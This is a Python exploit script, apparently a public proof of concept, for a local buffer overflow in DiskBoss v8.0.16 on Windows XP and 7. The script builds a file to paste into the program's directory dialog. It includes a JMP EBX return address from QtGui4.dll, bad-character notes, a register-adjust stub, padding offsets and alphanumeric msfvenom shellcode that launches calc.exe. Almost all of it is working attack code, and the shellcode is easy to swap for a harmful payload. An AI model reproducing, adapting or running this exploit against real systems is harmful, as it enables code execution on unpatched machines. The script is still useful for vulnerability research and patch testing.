#!/usr/bin/python

###############################################################################
# Exploit Title:  DiskBoss v8.0.16 - Local Buffer Overflow
# Date: 11-06-2017
# Exploit Author: @abatchy17 -- www.abatchy.com
# Vulnerable Software: DiskBoss v8.0.16 (Freeware, Pro and Ultimate)
# Vendor Homepage:    http://www.disksorter.com/    
# Version: 8.0.16
# Software Link:      http://www.diskboss.com/downloads.html (Freeware, Pro and Ultimate)
# Tested On: Windows XP SP3 (x86), Win7 SP1 (x86)
#
# To trigger the exploit, click "Search" -> second (+) sign -> "Add Input Directory" and paste the content of exploit.txt
#
# Only difference between this one and 42157 is that EBX is used
#
#  Note: No typos!!11!
#
##############################################################################

a = open("exploit.txt", "w")

# Message=  0x65182c15 : jmp ebx | asciiprint,ascii {PAGE_EXECUTE_READ} [QtGui4.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.3.4.0 (C:\Program Files\DiskBoss\bin\QtGui4.dll)
jmpebx = "\x15\x2c\x18\x65" # Why JMP EBX? Buffer at ESP is split, bad!

badchars = "\x0a\x0d\x2f"

# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -e x86/alpha_mixed BufferRegister=EAX -f python -b "\x0a\x0d\x2f"
buf =  ""
buf += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x6b\x4c\x5a\x48\x4f\x72\x57\x70\x75\x50\x43\x30\x43"
buf += "\x50\x4b\x39\x4d\x35\x44\x71\x79\x50\x63\x54\x6e\x6b"
buf += "\x62\x70\x76\x50\x6e\x6b\x42\x72\x46\x6c\x6e\x6b\x63"
buf += "\x62\x62\x34\x6c\x4b\x43\x42\x76\x48\x36\x6f\x68\x37"
buf += "\x73\x7a\x46\x46\x74\x71\x49\x6f\x4e\x4c\x57\x4c\x55"
buf += "\x31\x51\x6c\x35\x52\x46\x4c\x51\x30\x6a\x61\x6a\x6f"
buf += "\x64\x4d\x67\x71\x6b\x77\x79\x72\x68\x72\x70\x52\x70"
buf += "\x57\x6c\x4b\x53\x62\x36\x70\x6c\x4b\x52\x6a\x67\x4c"
buf += "\x4c\x4b\x50\x4c\x62\x31\x42\x58\x79\x73\x32\x68\x37"
buf += "\x71\x4a\x71\x73\x61\x4e\x6b\x63\x69\x31\x30\x35\x51"
buf += "\x69\x43\x4c\x4b\x50\x49\x64\x58\x58\x63\x46\x5a\x32"
buf += "\x69\x6e\x6b\x36\x54\x4e\x6b\x57\x71\x38\x56\x65\x61"
buf += "\x49\x6f\x6e\x4c\x69\x51\x7a\x6f\x66\x6d\x46\x61\x69"
buf += "\x57\x70\x38\x39\x70\x33\x45\x39\x66\x35\x53\x31\x6d"
buf += "\x68\x78\x75\x6b\x73\x4d\x71\x34\x70\x75\x38\x64\x33"
buf += "\x68\x4e\x6b\x32\x78\x51\x34\x65\x51\x39\x43\x31\x76"
buf += "\x4c\x4b\x64\x4c\x32\x6b\x6e\x6b\x62\x78\x65\x4c\x47"
buf += "\x71\x59\x43\x4c\x4b\x44\x44\x4c\x4b\x56\x61\x38\x50"
buf += "\x6f\x79\x52\x64\x54\x64\x34\x64\x63\x6b\x73\x6b\x50"
buf += "\x61\x50\x59\x71\x4a\x56\x31\x59\x6f\x59\x70\x33\x6f"
buf += "\x53\x6f\x71\x4a\x4c\x4b\x44\x52\x68\x6b\x6e\x6d\x53"
buf += "\x6d\x62\x4a\x56\x61\x4c\x4d\x6b\x35\x6d\x62\x75\x50"
buf += "\x45\x50\x75\x50\x32\x70\x32\x48\x76\x51\x4e\x6b\x30"
buf += "\x6f\x6f\x77\x39\x6f\x4e\x35\x4d\x6b\x58\x70\x4d\x65"
buf += "\x4e\x42\x53\x66\x62\x48\x6d\x76\x4a\x35\x6d\x6d\x4d"
buf += "\x4d\x69\x6f\x79\x45\x57\x4c\x46\x66\x53\x4c\x56\x6a"
buf += "\x6f\x70\x49\x6b\x6d\x30\x33\x45\x33\x35\x4d\x6b\x50"
buf += "\x47\x37\x63\x74\x32\x52\x4f\x53\x5a\x43\x30\x53\x63"
buf += "\x49\x6f\x38\x55\x52\x43\x63\x51\x50\x6c\x65\x33\x54"
buf += "\x6e\x62\x45\x54\x38\x62\x45\x55\x50\x41\x41"

llamaleftovers = (
    "\x53"  # push EBX
    "\x58"  # pop EAX
    "\x05\x55\x55\x55\x55"  # add EAX, 0x55555555
    "\x05\x55\x55\x55\x55"  # add EAX, 0x55555555
    "\x05\x56\x56\x55\x55"  # add EAX, 0x55555656 -> EAX = EBX + 233, shellcode generated should start exactly at EAX as we're using the x86/alpha_mixed with BufferRegister to get a purely alphanumeric shellcode
    )

junk = "\x53\x5b" * 119 + "\x53"

data = "A"*4096 + jmpebx + "C"*16 + jmpebx + "C"*(5296 - 4096 - 4 - 16 - 4) + llamaleftovers + junk + buf

a.write(data)
a.close()
